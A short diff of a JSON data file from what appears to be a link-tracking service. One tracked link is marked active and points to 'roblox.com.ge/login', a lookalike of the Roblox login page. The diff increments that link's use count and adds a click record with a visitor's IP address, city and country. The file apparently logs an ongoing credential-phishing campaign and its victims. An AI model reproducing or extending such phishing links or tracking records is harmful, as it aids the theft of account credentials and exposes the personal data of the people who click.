@@ -110,7 +110,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 844,
+    "useCount": 845,
     "createdBy": "admin",
     "clicks": [
       {
@@ -6864,6 +6864,14 @@
         "city": "Jonesboro",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777178778888,
+        "ip": "171.236.70.13",
+        "country": "Vietnam",
+        "city": "Hanoi",
+        "flag": "🇻🇳",
+        "countryCode": "VN"
       }
     ]
   },
